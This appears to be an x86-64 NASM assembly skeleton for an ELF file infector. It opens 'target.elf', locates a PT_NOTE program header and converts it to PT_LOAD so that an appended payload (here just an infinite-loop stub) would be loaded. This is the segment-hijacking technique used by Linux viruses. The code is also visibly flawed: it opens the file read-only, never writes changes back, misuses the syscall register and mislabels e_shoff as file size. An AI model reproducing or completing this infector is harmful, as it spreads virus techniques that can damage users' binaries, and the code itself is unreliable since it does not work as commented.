section .data
    file_name db "target.elf", 0        ; Name of the target ELF file
    note_type dd 0x4                   ; PT_NOTE type
    load_type dd 0x1                   ; PT_LOAD type
    payload db 0xEB, 0xFE              ; Simple infinite loop (jmp $)

section .bss
    elf_header resb 64                 ; Buffer for the ELF header (64 bytes for ELF64)
    program_headers resb 512           ; Buffer for the Program Headers

section .text
global _start

_start:
    ; Open the ELF file
    mov rax, 2                         ; syscall: open
    lea rdi, [file_name]               ; File name
    xor rsi, rsi                       ; O_RDONLY
    syscall

    test rax, rax                      ; Check if the file was opened successfully
    js exit                            ; Exit if an error occurred
    mov rdi, rax                       ; Save the file descriptor

    ; Read the ELF header
    mov rax, 0                         ; syscall: read
    lea rsi, [elf_header]              ; Buffer for ELF header
    mov rdx, 64                        ; Read 64 bytes (ELF header size)
    syscall

    ; Read the Program Header Table
    mov rax, [elf_header + 0x20]       ; Offset to the Program Header Table
    mov rsi, program_headers           ; Buffer for Program Headers
    mov rdx, 512                       ; Max size to read
    syscall

    ; Find and replace PT_NOTE
    lea rsi, [program_headers]         ; Start of Program Headers
    mov rcx, 64                        ; Maximum number of Program Headers
find_note:
    mov eax, [note_type]               ; Load PT_NOTE type
    cmp [rsi], eax                     ; Compare with current Program Header type
    je convert_to_load                 ; Found PT_NOTE
    add rsi, 0x38                      ; Move to the next Program Header (56 bytes)
    loop find_note                     ; Repeat until match is found

    ; If no PT_NOTE is found, exit
    jmp exit

convert_to_load:
    ; Convert PT_NOTE to PT_LOAD
    mov eax, [load_type]               ; Load PT_LOAD type
    mov [rsi], eax                     ; Update the Program Header type

    ; Set p_offset and p_vaddr
    mov rax, [elf_header + 0x28]       ; Current file size
    mov qword [rsi + 0x08], rax        ; Set p_offset
    mov rbx, 0x400000                  ; Base address
    add rbx, rax                       ; Calculate p_vaddr
    mov qword [rsi + 0x10], rbx        ; Set p_vaddr

exit:
    ; Exit the program
    mov rax, 60                        ; syscall: exit
    xor rdi, rdi                       ; Exit code 0
    syscall
  
